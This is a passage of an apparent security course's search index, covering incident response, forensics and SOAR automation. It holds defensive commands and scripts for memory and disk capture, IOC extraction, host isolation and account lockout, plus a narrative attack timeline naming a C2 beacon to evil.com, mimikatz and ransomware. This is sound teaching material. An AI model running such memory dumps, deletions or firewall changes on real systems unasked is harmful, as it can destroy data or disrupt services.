C:\\evidence\\System.evtx wevtutil epl Security C:\\evidence\\Security.evtx wevtutil epl Application C:\\evidence\\Application.evtx # Web server logs sudo cp /var/log/apache2/access.log /mnt/evidence/ sudo cp /var/log/apache2/error.log /mnt/evidence/ Timeline creation: # Create timeline with log2timeline/plaso log2timeline.py timeline.plaso /mnt/evidence/ # Generate timeline psort.py -o l2tcsv -w timeline.csv timeline.plaso # Filter timeline psort.py -o l2tcsv timeline.plaso \"date > '2024-01-15 14:00:00'\" Chain of Custody Documentation required: Evidence Form Case Number: IR-2024-001 Evidence Number: E-001 Date/Time Collected: 2024-01-15 14:23:15 UTC Collected By: John Smith, Incident Responder Location: Server Room, Building A, Floor 3 Description: Hard drive from compromised web server Make/Model: Seagate ST2000DM008 2TB Serial Number: ZDH12345 Hash (SHA-256): abc123def456... Chain of Custody: Date/Time | Transferred From | Transferred To | Purpose | Signature ---------------------------------------------------------------------- 2024-01-15 14:23 | John Smith | Evidence locker | Storage | J. Smith 2024-01-15 16:45 | Evidence locker | Jane Doe | Analysis | J. Doe 2024-01-16 10:00 | Jane Doe | Evidence locker | Storage | J. Doe Analysis Timeline Reconstruction Build event timeline: 2024-01-15 13:45:22 - Phishing email received by user@company.com 2024-01-15 13:47:15 - User clicks malicious link 2024-01-15 13:47:23 - Malware downloaded (invoice.pdf.exe) 2024-01-15 13:48:01 - Malware executed 2024-01-15 13:48:15 - First C2 beacon to evil.com 2024-01-15 14:15:33 - Credential dumping (mimikatz) 2024-01-15 14:45:22 - Lateral movement to file server 2024-01-15 15:23:11 - Large file transfer begins (data exfiltration) 2024-01-15 16:30:44 - Ransomware deployment 2024-01-15 16:31:00 - Files encrypted 2024-01-15 16:35:12 - Ransom note displayed Root Cause Analysis 5 Whys technique: Problem: Ransomware encrypted critical files Why? Ransomware was executed on the network Why? Attacker had access to deploy ransomware Why? Attacker moved laterally from initial compromise Why? User credentials were compromised Why? User clicked phishing link and ran malware Root cause: Insufficient user security awareness training No email filtering for malicious links Indicators of Compromise Extraction Create IOC list: #!/usr/bin/env python3 # extract_iocs.py import re import sys def extract_iocs(logfile): \"\"\"Extract IOCs from logs\"\"\" iocs = { 'ips': set(), 'domains': set(), 'urls': set(), 'hashes': set(), 'emails': set() } # Regex patterns ip_pattern = r'\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b' domain_pattern = r'\\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\\b' url_pattern = r'https?://[^\\s<>\"{}|\\\\^`\\[\\]]+' hash_pattern = r'\\b[a-f0-9]{32}\\b|\\b[a-f0-9]{40}\\b|\\b[a-f0-9]{64}\\b' email_pattern = r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b' with open(logfile, 'r', errors='ignore') as f: content = f.read() iocs['ips'].update(re.findall(ip_pattern, content)) iocs['domains'].update(re.findall(domain_pattern, content)) iocs['urls'].update(re.findall(url_pattern, content)) iocs['hashes'].update(re.findall(hash_pattern, content)) iocs['emails'].update(re.findall(email_pattern, content)) # Remove private/internal IPs iocs['ips'] = {ip for ip in iocs['ips'] if not ip.startswith(('10.', '192.168.', '172.'))} return iocs # Usage if __name__ == '__main__': iocs = extract_iocs(sys.argv[1]) print(\"=== Indicators of Compromise ===\\n\") print(f\"IPs ({len(iocs['ips'])}):\") for ip in sorted(iocs['ips']): print(f\" {ip}\") print(f\"\\nDomains ({len(iocs['domains'])}):\") for domain in sorted(iocs['domains']): print(f\" {domain}\") print(f\"\\nFile Hashes ({len(iocs['hashes'])}):\") for hash_val in sorted(iocs['hashes']): print(f\" {hash_val}\") Eradication & Recovery Malware Removal Clean infected systems: # Identify malware ps aux | grep suspicious_process netstat -tulpn | grep suspicious_connection # Kill malicious processes sudo kill -9 <pid> # Remove malicious files sudo rm -f /tmp/malware.exe sudo rm -f /var/tmp/.hidden_backdoor # Remove persistence sudo crontab -e # Remove malicious cron jobs sudo systemctl disable malicious.service sudo rm /etc/systemd/system/malicious.service # Check and remove from startup sudo nano /etc/rc.local Or rebuild from scratch: - Faster and more reliable - Ensures complete eradication - Restore from clean backup - Apply all patches before reconnecting System Hardening Before bringing systems back online: # Update all software sudo apt update && sudo apt upgrade -y # Remove unnecessary services sudo systemctl disable <unused_service> # Configure firewall sudo ufw enable sudo ufw default deny incoming sudo ufw default allow outgoing sudo ufw allow ssh # Harden SSH sudo nano /etc/ssh/sshd_config # PermitRootLogin no # PasswordAuthentication no # AllowUsers specific_user # Enable logging sudo systemctl enable rsyslog sudo systemctl enable auditd Verification Confirm eradication: # Scan for malware sudo clamscan -r / sudo rkhunter --check # Check for suspicious processes ps aux | grep -E 'malware|suspicious' # Check network connections sudo netstat -tulpn | grep ESTABLISHED # Review startup items systemctl list-unit-files | grep enabled # Check for new users cat /etc/passwd | tail -10 # Monitor for 72 hours before declaring success Post-Incident Activities Lessons Learned Meeting Within 2 weeks of incident closure Agenda: 1. What happened? (timeline) 2. What went well? 3. What could be improved? 4. What will we do differently? 5. Action items with owners and dates Questions to answer: How was the incident detected? Was detection timely? Were procedures followed? Were roles and responsibilities clear? Were tools adequate? Was communication effective? What's the estimated cost/impact? How can we prevent recurrence? Incident Report Executive summary: - What happened (non-technical) - Impact on business - Actions taken - Current status - Next steps Technical details: - Attack vector - Timeline of events - Systems affected - Indicators of compromise - Evidence collected - Analysis findings Response effectiveness: - What worked well - What needs improvement - Resources used - Costs incurred Recommendations: - Immediate actions - Short-term improvements (30 days) - Long-term improvements (90+ days) - Budget requirements Key Takeaways Incident response success requires: - Preparation before incidents occur - Clear roles and responsibilities - Well-practiced procedures - Proper tools and training - Effective communication - Thorough documentation Evidence handling: - Maintain chain of custody - Preserve original evidence - Work on copies - Document everything - Hash all evidence Critical skills: - Quick decision-making under pressure - Technical analysis capability - Clear communication - Attention to detail - Staying calm Remember: - Every incident is a learning opportunity - Speed matters but accuracy matters more - Documentation is crucial - Team coordination is essential - Practice makes perfect Incident response is high-pressure work that requires both technical skill and cool judgment. Regular training, tabletop exercises, and continuous improvement will prepare you to handle real incidents effectively.","title":"Lesson 10.2"},{"location":"LECTURES/unit10/lesson10-2/#incident-response-and-digital-forensics","text":"When prevention fails, incident response saves the day. This lesson covers how to detect, respond to, and recover from security incidents while preserving evidence for investigation and potential legal proceedings.","title":"Incident Response and Digital Forensics"},{"location":"LECTURES/unit10/lesson10-2/#incident-response-framework","text":"","title":"Incident Response Framework"},{"location":"LECTURES/unit10/lesson10-2/#nist-incident-response-lifecycle","text":"4 phases: Preparation - Build capability before incident occurs Detection & Analysis - Identify and understand incident Containment, Eradication & Recovery - Stop damage and restore Post-Incident Activity - Learn and improve","title":"NIST Incident Response Lifecycle"},{"location":"LECTURES/unit10/lesson10-2/#sans-incident-response-process","text":"6 steps: Preparation - Tools, training, policies Identification - Detect and verify incident Containment - Limit damage Eradication - Remove threat Recovery - Restore systems Lessons Learned - Document and improve","title":"SANS Incident Response Process"},{"location":"LECTURES/unit10/lesson10-2/#preparation-phase","text":"","title":"Preparation Phase"},{"location":"LECTURES/unit10/lesson10-2/#building-an-incident-response-team","text":"Core roles: Incident Response Manager - Coordinates response - Makes critical decisions - Communicates with stakeholders - Manages resources Security Analyst - Analyzes alerts and logs - Identifies indicators of compromise - Performs triage - Documents findings Forensic Investigator - Preserves evidence - Analyzes systems - Reconstructs events - Prepares reports System Administrator - Provides technical access - Implements containment - Restores systems - Maintains business operations Legal Counsel - Advises on legal obligations - Manages law enforcement interaction - Protects attorney-client privilege - Handles disclosure requirements Communications Lead - Internal communications - External communications - Media relations - Customer notifications","title":"Building an Incident Response Team"},{"location":"LECTURES/unit10/lesson10-2/#essential-tools","text":"Network monitoring: - Wireshark / tcpdump - Zeek (Bro) - Security Onion - Suricata / Snort Endpoint detection: - OSSEC / Wazuh - Sysmon - osquery - Velociraptor Memory analysis: - Volatility - Rekall - WinDbg Disk forensics: - Autopsy / Sleuth Kit - FTK Imager - EnCase - X-Ways Forensics Log analysis: - ELK Stack (Elasticsearch, Logstash, Kibana) - Splunk - Graylog Malware analysis: - Cuckoo Sandbox - REMnux - FLARE VM - IDA Pro / Ghidra","title":"Essential Tools"},{"location":"LECTURES/unit10/lesson10-2/#incident-response-plan","text":"Key components: 1. Contact Information - Team members (phone, email, backup) - Vendors (IT, security, legal) - Law enforcement - Insurance 2. Roles and Responsibilities - Who does what - Decision authority - Escalation paths 3. Communication Plan - Internal notifications - External notifications - Media statements - Customer communications 4. Detection and Analysis - Alert sources - Triage procedures - Severity classification - Documentation requirements 5. Containment Strategies - Network isolation procedures - Account disabling - System shutdown criteria 6. Evidence Collection - Chain of custody forms - Collection procedures - Storage requirements 7. Eradication and Recovery - Malware removal - System rebuild - Verification procedures 8. Post-Incident - Lessons learned template - Improvement tracking","title":"Incident Response Plan"},{"location":"LECTURES/unit10/lesson10-2/#detection-analysis","text":"","title":"Detection &amp; Analysis"},{"location":"LECTURES/unit10/lesson10-2/#indicators-of-compromise-iocs","text":"Network IOCs: - Suspicious IP addresses - Unusual DNS queries - C2 beacon patterns - Large data transfers - Connections to known bad domains Host IOCs: - Unexpected processes - New user accounts - Modified system files - Suspicious registry keys - Scheduled tasks - Unknown services Application IOCs: - Failed login attempts - Privilege escalation - Unusual access patterns - Error messages - Configuration changes","title":"Indicators of Compromise (IOCs)"},{"location":"LECTURES/unit10/lesson10-2/#alert-triage","text":"Priority classification: Critical (P1): - Active data exfiltration - Ransomware execution - System compromise with admin access - Critical infrastructure impact - Response time: Immediate High (P2): - Malware detected - Privilege escalation attempt - Credential compromise - Response time: < 1 hour Medium (P3): - Policy violation - Suspicious activity - Reconnaissance detected - Response time: < 4 hours Low (P4): - Failed attack attempt - Scanner activity - False positive likely - Response time: < 24 hours","title":"Alert Triage"},{"location":"LECTURES/unit10/lesson10-2/#initial-analysis","text":"Questions to answer: What happened? Type of incident Attack vector Malware involved When did it start? First compromise Detection time Dwell time What systems affected? Compromised hosts Accessed data Network segments Who is the attacker? Internal/external Sophistication level Possible attribution What's the impact? Data loss System availability Business impact","title":"Initial Analysis"},{"location":"LECTURES/unit10/lesson10-2/#containment","text":"","title":"Containment"},{"location":"LECTURES/unit10/lesson10-2/#short-term-containment","text":"Immediate actions to limit damage: Network isolation: # Isolate host using firewall iptables -I INPUT 1 -s <attacker_ip> -j DROP iptables -I OUTPUT 1 -d <attacker_ip> -j DROP # Or disconnect network entirely ifconfig eth0 down # On Windows netsh interface set interface \"Ethernet\" admin=disable Account suspension: # Disable compromised user (Linux) passwd -l username usermod -L username # Disable AD account (Windows) Disable-ADAccount -Identity username # Force password reset Set-ADAccountPassword -Identity username -Reset Block malicious IPs: # Firewall rules ufw deny from <malicious_ip> # At network level (contact network team) # Block at firewall/IDS","title":"Short-term Containment"},{"location":"LECTURES/unit10/lesson10-2/#long-term-containment","text":"Allows business to continue while preparing for eradication: Segment network: - Move affected systems to isolated VLAN - Restrict traffic flow - Monitor for lateral movement Apply patches: - Patch exploited vulnerabilities - Update signatures - Harden configurations Strengthen authentication: - Force password resets - Implement MFA - Review permissions","title":"Long-term Containment"},{"location":"LECTURES/unit10/lesson10-2/#evidence-collection","text":"","title":"Evidence Collection"},{"location":"LECTURES/unit10/lesson10-2/#order-of-volatility","text":"Collect most volatile data first: Registers, cache - Nanoseconds Memory (RAM) - Seconds to minutes Network connections - Seconds Running processes - Seconds Open files - Minutes Network configuration - Minutes Disk contents - Hours to days Logs - Days to months Backups - Months to years","title":"Order of Volatility"},{"location":"LECTURES/unit10/lesson10-2/#memory-acquisition","text":"Linux: # Using LiME (Linux Memory Extractor) sudo insmod lime.ko \"path=/tmp/memory.dump format=lime\" # Or dump with dd (less reliable) sudo dd if=/dev/mem of=/tmp/memory.dump bs=1M Windows: # Using WinPMEM winpmem.exe memory.dump # Using DumpIt DumpIt.exe # Using FTK Imager # GUI tool - select Capture Memory Memory analysis: # Volatility framework volatility -f memory.dump imageinfo # List processes volatility -f memory.dump --profile=Win10x64 pslist # Network connections volatility -f memory.dump --profile=Win10x64 netscan # List DLLs volatility -f memory.dump --profile=Win10x64 dlllist # Dump process volatility -f memory.dump --profile=Win10x64 procdump -p 1234 -D output/ # Scan for malware volatility -f memory.dump --profile=Win10x64 malfind","title":"Memory Acquisition"},{"location":"LECTURES/unit10/lesson10-2/#disk-acquisition","text":"Create forensic image: # Using dd (forensic copy) sudo dd if=/dev/sda of=/mnt/evidence/disk.img bs=4M status=progress conv=noerror,sync # Calculate hash sha256sum /mnt/evidence/disk.img > /mnt/evidence/disk.img.sha256 # Using dcfldd (better for forensics) sudo dcfldd if=/dev/sda of=/mnt/evidence/disk.img hash=sha256 hashlog=/mnt/evidence/hash.log # Using FTK Imager (Windows GUI) # File \u2192 Create Disk Image \u2192 Select source \u2192 Create image Mount as read-only: # Mount forensic image sudo mount -o ro,loop disk.img /mnt/evidence # Or use write blocker hardware","title":"Disk Acquisition"},{"location":"LECTURES/unit10/lesson10-2/#network-evidence","text":"Capture live traffic: # Full packet capture sudo tcpdump -i eth0 -w incident.pcap # Capture specific host sudo tcpdump -i eth0 host 192.168.1.100 -w suspect.pcap # Capture for specific time timeout 3600 sudo tcpdump -i eth0 -w hourly.pcap Export NetFlow data: # Export flows from router/switch # Query flow collector for incident timeframe nfdump -R /data/flows -t 2024-01-15.14:00-2024-01-15.16:00 -o extended","title":"Network Evidence"},{"location":"LECTURES/unit10/lesson10-2/#log-collection","text":"Centralized logging: # Linux system logs sudo cp -r /var/log /mnt/evidence/logs/ # Windows Event logs wevtutil epl System C:\\evidence\\System.evtx wevtutil epl Security C:\\evidence\\Security.evtx wevtutil epl Application C:\\evidence\\Application.evtx # Web server logs sudo cp /var/log/apache2/access.log /mnt/evidence/ sudo cp /var/log/apache2/error.log /mnt/evidence/ Timeline creation: # Create timeline with log2timeline/plaso log2timeline.py timeline.plaso /mnt/evidence/ # Generate timeline psort.py -o l2tcsv -w timeline.csv timeline.plaso # Filter timeline psort.py -o l2tcsv timeline.plaso \"date > '2024-01-15 14:00:00'\"","title":"Log Collection"},{"location":"LECTURES/unit10/lesson10-2/#chain-of-custody","text":"Documentation required: Evidence Form Case Number: IR-2024-001 Evidence Number: E-001 Date/Time Collected: 2024-01-15 14:23:15 UTC Collected By: John Smith, Incident Responder Location: Server Room, Building A, Floor 3 Description: Hard drive from compromised web server Make/Model: Seagate ST2000DM008 2TB Serial Number: ZDH12345 Hash (SHA-256): abc123def456... Chain of Custody: Date/Time | Transferred From | Transferred To | Purpose | Signature ---------------------------------------------------------------------- 2024-01-15 14:23 | John Smith | Evidence locker | Storage | J. Smith 2024-01-15 16:45 | Evidence locker | Jane Doe | Analysis | J. Doe 2024-01-16 10:00 | Jane Doe | Evidence locker | Storage | J. Doe","title":"Chain of Custody"},{"location":"LECTURES/unit10/lesson10-2/#analysis","text":"","title":"Analysis"},{"location":"LECTURES/unit10/lesson10-2/#timeline-reconstruction","text":"Build event timeline: 2024-01-15 13:45:22 - Phishing email received by user@company.com 2024-01-15 13:47:15 - User clicks malicious link 2024-01-15 13:47:23 - Malware downloaded (invoice.pdf.exe) 2024-01-15 13:48:01 - Malware executed 2024-01-15 13:48:15 - First C2 beacon to evil.com 2024-01-15 14:15:33 - Credential dumping (mimikatz) 2024-01-15 14:45:22 - Lateral movement to file server 2024-01-15 15:23:11 - Large file transfer begins (data exfiltration) 2024-01-15 16:30:44 - Ransomware deployment 2024-01-15 16:31:00 - Files encrypted 2024-01-15 16:35:12 - Ransom note displayed","title":"Timeline Reconstruction"},{"location":"LECTURES/unit10/lesson10-2/#root-cause-analysis","text":"5 Whys technique: Problem: Ransomware encrypted critical files Why? Ransomware was executed on the network Why? Attacker had access to deploy ransomware Why? Attacker moved laterally from initial compromise Why? User credentials were compromised Why? User clicked phishing link and ran malware Root cause: Insufficient user security awareness training No email filtering for malicious links","title":"Root Cause Analysis"},{"location":"LECTURES/unit10/lesson10-2/#indicators-of-compromise-extraction","text":"Create IOC list: #!/usr/bin/env python3 # extract_iocs.py import re import sys def extract_iocs(logfile): \"\"\"Extract IOCs from logs\"\"\" iocs = { 'ips': set(), 'domains': set(), 'urls': set(), 'hashes': set(), 'emails': set() } # Regex patterns ip_pattern = r'\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b' domain_pattern = r'\\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\\b' url_pattern = r'https?://[^\\s<>\"{}|\\\\^`\\[\\]]+' hash_pattern = r'\\b[a-f0-9]{32}\\b|\\b[a-f0-9]{40}\\b|\\b[a-f0-9]{64}\\b' email_pattern = r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b' with open(logfile, 'r', errors='ignore') as f: content = f.read() iocs['ips'].update(re.findall(ip_pattern, content)) iocs['domains'].update(re.findall(domain_pattern, content)) iocs['urls'].update(re.findall(url_pattern, content)) iocs['hashes'].update(re.findall(hash_pattern, content)) iocs['emails'].update(re.findall(email_pattern, content)) # Remove private/internal IPs iocs['ips'] = {ip for ip in iocs['ips'] if not ip.startswith(('10.', '192.168.', '172.'))} return iocs # Usage if __name__ == '__main__': iocs = extract_iocs(sys.argv[1]) print(\"=== Indicators of Compromise ===\\n\") print(f\"IPs ({len(iocs['ips'])}):\") for ip in sorted(iocs['ips']): print(f\" {ip}\") print(f\"\\nDomains ({len(iocs['domains'])}):\") for domain in sorted(iocs['domains']): print(f\" {domain}\") print(f\"\\nFile Hashes ({len(iocs['hashes'])}):\") for hash_val in sorted(iocs['hashes']): print(f\" {hash_val}\")","title":"Indicators of Compromise Extraction"},{"location":"LECTURES/unit10/lesson10-2/#eradication-recovery","text":"","title":"Eradication &amp; Recovery"},{"location":"LECTURES/unit10/lesson10-2/#malware-removal","text":"Clean infected systems: # Identify malware ps aux | grep suspicious_process netstat -tulpn | grep suspicious_connection # Kill malicious processes sudo kill -9 <pid> # Remove malicious files sudo rm -f /tmp/malware.exe sudo rm -f /var/tmp/.hidden_backdoor # Remove persistence sudo crontab -e # Remove malicious cron jobs sudo systemctl disable malicious.service sudo rm /etc/systemd/system/malicious.service # Check and remove from startup sudo nano /etc/rc.local Or rebuild from scratch: - Faster and more reliable - Ensures complete eradication - Restore from clean backup - Apply all patches before reconnecting","title":"Malware Removal"},{"location":"LECTURES/unit10/lesson10-2/#system-hardening","text":"Before bringing systems back online: # Update all software sudo apt update && sudo apt upgrade -y # Remove unnecessary services sudo systemctl disable <unused_service> # Configure firewall sudo ufw enable sudo ufw default deny incoming sudo ufw default allow outgoing sudo ufw allow ssh # Harden SSH sudo nano /etc/ssh/sshd_config # PermitRootLogin no # PasswordAuthentication no # AllowUsers specific_user # Enable logging sudo systemctl enable rsyslog sudo systemctl enable auditd","title":"System Hardening"},{"location":"LECTURES/unit10/lesson10-2/#verification","text":"Confirm eradication: # Scan for malware sudo clamscan -r / sudo rkhunter --check # Check for suspicious processes ps aux | grep -E 'malware|suspicious' # Check network connections sudo netstat -tulpn | grep ESTABLISHED # Review startup items systemctl list-unit-files | grep enabled # Check for new users cat /etc/passwd | tail -10 # Monitor for 72 hours before declaring success","title":"Verification"},{"location":"LECTURES/unit10/lesson10-2/#post-incident-activities","text":"","title":"Post-Incident Activities"},{"location":"LECTURES/unit10/lesson10-2/#lessons-learned-meeting","text":"Within 2 weeks of incident closure Agenda: 1. What happened? (timeline) 2. What went well? 3. What could be improved? 4. What will we do differently? 5. Action items with owners and dates Questions to answer: How was the incident detected? Was detection timely? Were procedures followed? Were roles and responsibilities clear? Were tools adequate? Was communication effective? What's the estimated cost/impact? How can we prevent recurrence?","title":"Lessons Learned Meeting"},{"location":"LECTURES/unit10/lesson10-2/#incident-report","text":"Executive summary: - What happened (non-technical) - Impact on business - Actions taken - Current status - Next steps Technical details: - Attack vector - Timeline of events - Systems affected - Indicators of compromise - Evidence collected - Analysis findings Response effectiveness: - What worked well - What needs improvement - Resources used - Costs incurred Recommendations: - Immediate actions - Short-term improvements (30 days) - Long-term improvements (90+ days) - Budget requirements","title":"Incident Report"},{"location":"LECTURES/unit10/lesson10-2/#key-takeaways","text":"Incident response success requires: - Preparation before incidents occur - Clear roles and responsibilities - Well-practiced procedures - Proper tools and training - Effective communication - Thorough documentation Evidence handling: - Maintain chain of custody - Preserve original evidence - Work on copies - Document everything - Hash all evidence Critical skills: - Quick decision-making under pressure - Technical analysis capability - Clear communication - Attention to detail - Staying calm Remember: - Every incident is a learning opportunity - Speed matters but accuracy matters more - Documentation is crucial - Team coordination is essential - Practice makes perfect Incident response is high-pressure work that requires both technical skill and cool judgment. Regular training, tabletop exercises, and continuous improvement will prepare you to handle real incidents effectively.","title":"Key Takeaways"},{"location":"LECTURES/unit10/lesson10-3/","text":"Security Automation and SOAR Security operations centers (SOCs) are overwhelmed with alerts. Automation is no longer optional\u2014it's essential. This lesson covers security automation, orchestration, and SOAR (Security Orchestration, Automation, and Response) platforms. The Case for Automation The Alert Fatigue Problem Typical SOC challenges: - 10,000+ alerts per day - 99% are false positives or low priority - Analysts spend 80% of time on repetitive tasks - Average time to investigate: 3-5 hours - Critical threats get lost in noise - Analyst burnout and turnover What automation solves: - Triage alerts automatically - Enrich with threat intelligence - Execute standard response actions - Document everything - Free analysts for complex investigations ROI of Automation Cost savings: Manual investigation: 3 hours \u00d7 $50/hour = $150 Automated triage: 5 minutes \u00d7 $50/hour = $4.17 Savings per alert: $145.83 With 1,000 alerts/day: Annual savings: $145.83 \u00d7 1000 \u00d7 365 = $53+ million Efficiency gains: - Respond in seconds vs. hours - Consistent response quality - 24/7 operation - Scale without hiring Security Automation Basics Types of Automation Alert enrichment: - IP reputation lookup - Domain age check - VirusTotal scan - WHOIS lookup - Geolocation - Historical activity Containment actions: - Block IP at firewall - Disable user account - Isolate infected host - Quarantine email - Reset password Investigation automation: - Query logs automatically - Correlate events - Extract IOCs - Search threat intel - Generate timeline Response orchestration: - Create ticket - Send notifications - Execute playbooks - Update case management - Generate reports Automation Pyramid Level 4: Full Automation (autonomous response) \u2191 Level 3: Orchestration (multi-tool workflows) \u2191 Level 2: Scripting (single-tool automation) \u2191 Level 1: Manual (analyst does everything) Start at Level 2, progress to Level 4. Scripting for Security Python Security Automation Example: Automated alert enrichment #!/usr/bin/env python3 import requests import json class AlertEnricher: def __init__(self, vt_api_key): self.vt_api_key = vt_api_key def check_ip_reputation(self, ip): \"\"\"Check IP against VirusTotal\"\"\" url = f\"https://www.virustotal.com/api/v3/ip_addresses/{ip}\" headers = {\"x-apikey\": self.vt_api_key} response = requests.get(url, headers=headers) if response.status_code == 200: data = response.json() stats = data['data']['attributes']['last_analysis_stats'] return { 'malicious': stats.get('malicious', 0), 'suspicious': stats.get('suspicious', 0), 'total_engines': sum(stats.values()), 'reputation': 'malicious' if stats.get('malicious', 0) > 0 else 'clean' } return None def get_domain_info(self, domain): \"\"\"Get WHOIS and age info\"\"\" import whois try: w = whois.whois(domain) return { 'registrar': w.registrar, 'creation_date': str(w.creation_date), 'expiration_date': str(w.expiration_date), 'age_days': (datetime.now() - w.creation_date).days if w.creation_date else None } except: return None def enrich_alert(self, alert): \"\"\"Enrich alert with contextual information\"\"\" enriched = alert.copy() # Check source IP if 'src_ip' in alert: enriched['src_ip_reputation'] = self.check_ip_reputation(alert['src_ip']) # Check destination IP if 'dst_ip' in alert: enriched['dst_ip_reputation'] = self.check_ip_reputation(alert['dst_ip']) # Check domain if 'domain' in alert: enriched['domain_info'] = self.get_domain_info(alert['domain']) # Calculate risk score enriched['risk_score'] = self.calculate_risk_score(enriched) return enriched def calculate_risk_score(self, alert): \"\"\"Calculate risk score based on enrichment data\"\"\" score = 0 # IP reputation if alert.get('src_ip_reputation', {}).get('malicious', 0) > 0: score += 50 # New domain domain_age = alert.get('domain_info', {}).get('age_days') if domain_age and domain_age < 30: score += 30 # Severity if alert.get('severity') == 'critical': score += 20 return min(score, 100) # Cap at 100 # Usage enricher = AlertEnricher(vt_api_key='your_api_key') alert = { 'id': 'ALT-12345', 'severity': 'high', 'src_ip': '198.51.100.42', 'dst_ip': '203.0.113.10', 'domain': 'suspicious-domain.com' } enriched_alert = enricher.enrich_alert(alert) print(json.dumps(enriched_alert, indent=2)) Automated Response Actions Example: Auto-block malicious IPs #!/usr/bin/env python3 import subprocess import logging from datetime import datetime class AutoResponder: def __init__(self, log_file='auto_response.log'): logging.basicConfig( filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s' ) self.logger = logging def block_ip(self, ip, reason): \"\"\"Block IP at firewall\"\"\" try: # Using iptables cmd = f\"sudo iptables -I INPUT 1 -s {ip} -j DROP\" subprocess.run(cmd.split(), check=True) self.logger.info(f\"BLOCKED IP: {ip} - Reason: {reason}\") # Add to blocklist file with open('/etc/security/blocklist.txt', 'a') as f: f.write(f\"{ip}\\t{datetime.now()}\\t{reason}\\n\") return True except Exception as e: self.logger.error(f\"Failed to block {ip}: {e}\") return False def disable_user_account(self, username, reason): \"\"\"Disable compromised user account\"\"\" try: # Linux subprocess.run(['sudo', 'passwd', '-l', username], check=True) self.logger.info(f\"DISABLED ACCOUNT: {username} - Reason: {reason}\") # Send notification self.send_notification( f\"User account {username} has been disabled due to: {reason}\" ) return True except Exception as e: self.logger.error(f\"Failed to disable {username}: {e}\") return False def isolate_host(self, hostname, reason): \"\"\"Isolate compromised host\"\"\" try: # This would integrate with your network management # Example: modify firewall rules, change VLAN, etc. self.logger.info(f\"ISOLATED HOST: {hostname} - Reason: {reason}\") # Create incident ticket self.create_ticket( title=f\"Host Isolation: {hostname}\", description=f\"Automatically isolated due to: {reason}\", priority='high' ) return True except Exception as e: self.logger.error(f\"Failed to isolate {hostname}: {e}\") return False def send_notification(self, message): \"\"\"Send notification to security team\"\"\" # Integrate with Slack, email, SMS, etc. print(f\"NOTIFICATION: {message}\") def create_ticket(self, title, description, priority): \"\"\"Create incident ticket\"\"\" # Integrate with JIRA, ServiceNow, etc. print(f\"TICKET CREATED: {title} - {priority}\") # Usage responder = AutoResponder() # Automated response to brute force if failed_login_count > 10: responder.block_ip(source_ip, \"Brute force attempt\") responder.create_ticket( title=f\"Brute force from {source_ip}\", description=f\"Blocked after {failed_login_count} failed attempts\", priority='medium' ) SOAR Platforms What is SOAR? Security Orchestration, Automation, and Response Components: 1. Orchestration - Connect multiple tools 2. Automation - Execute actions automatically 3. Response - Standardized playbooks 4. Case Management - Track investigations 5. Threat Intelligence - Integrate feeds Popular SOAR platforms: - Splunk Phantom (now SOAR) - IBM Resilient - Palo Alto Cortex XSOAR - Swimlane - Demisto (acquired by Palo Alto) - TheHive Project (open source) Playbooks Automated response workflows Phishing investigation playbook: 1. Receive phishing alert \u2193 2. Extract email metadata - Sender, subject, attachments - URLs, headers \u2193 3. Enrich indicators - Check URLs against threat intel - Scan attachments with sandbox - Look up sender reputation \u2193 4. Assess risk If malicious: - Quarantine email across organization - Block sender - Add IOCs to blocklist If suspicious: - Flag for analyst review - Request user confirmation If benign: - Release from quarantine - Close case \u2193 5. Document findings - Update case - Generate report - Close ticket Malware detection playbook: 1. Malware detected on endpoint \u2193 2. Gather context - Process tree - Network connections - File hashes \u2193 3. Containment - Isolate host from network - Kill malicious process - Block C2 domain \u2193 4. Analysis - Submit sample to sandbox - Check threat intelligence - Identify IOCs \u2193 5. Hunt for additional infections - Search for IOCs across environment - Check other endpoints \u2193 6. Remediation - Clean or reimage infected hosts - Block identified IOCs - Update signatures \u2193 7. Recovery - Restore from backup if needed - Verify system clean - Return to production Integrations Common integrations: SIEM: - Splunk - Elastic - QRadar - ArcSight EDR: - CrowdStrike - Carbon Black - SentinelOne - Microsoft Defender Firewall: - Palo Alto - Fortinet - Cisco - pfSense Threat Intelligence: - VirusTotal - AlienVault OTX - MISP - ThreatConnect Ticketing: - ServiceNow - JIRA - Remedy - Zendesk Communication: - Slack - Microsoft Teams - Email - SMS Building Custom Automation TheHive + Cortex Example Open-source SOAR platform Architecture: TheHive (Case Management) \u2195 Cortex (Analyzers & Responders) \u2195 External Services (VirusTotal, MISP, etc.) Creating custom analyzer: #!/usr/bin/env python3 from cortexutils.analyzer import Analyzer class CustomIPAnalyzer(Analyzer): def __init__(self): Analyzer.__init__(self) self.api_key = self.get_param('config.api_key', None, 'API key is missing') def summary(self, raw): \"\"\"Generate summary for TheHive\"\"\" taxonomies = [] level = \"info\" namespace = \"CustomAnalyzer\" predicate = \"Reputation\" if raw['reputation'] == 'malicious': level = \"malicious\" value = \"Malicious\" else: value = \"Clean\" taxonomies.append(self.build_taxonomy(level, namespace, predicate, value)) return {\"taxonomies\": taxonomies} def run(self): \"\"\"Main analysis logic\"\"\" if self.data_type == 'ip': ip = self.get_data() # Your analysis logic here result = { 'ip': ip, 'reputation': self.check_reputation(ip), 'threat_score': self.calculate_threat_score(ip), 'sources': self.query_threat_feeds(ip) } self.report(result) else: self.error('Invalid data type') def check_reputation(self, ip): # Implementation pass def calculate_threat_score(self, ip): # Implementation pass def query_threat_feeds(self, ip): # Implementation pass if __name__ == '__main__': CustomIPAnalyzer().run() Ansible for Security Automation Playbook for incident response: --- - name: Incident Response Playbook hosts: affected_hosts become: yes tasks: - name: Isolate host from network command: ifconfig eth0 down register: isolation_result - name: Kill malicious process shell: pkill -9 -f \"{{ malicious_process }}\" ignore_errors: yes - name: Collect evidence block: - name: Dump memory command: lime-dump /tmp/memory.dump - name: Collect logs archive: path: - /var/log/syslog - /var/log/auth.log dest: /tmp/logs.tar.gz - name: List processes shell: ps aux > /tmp/processes.txt - name: List network 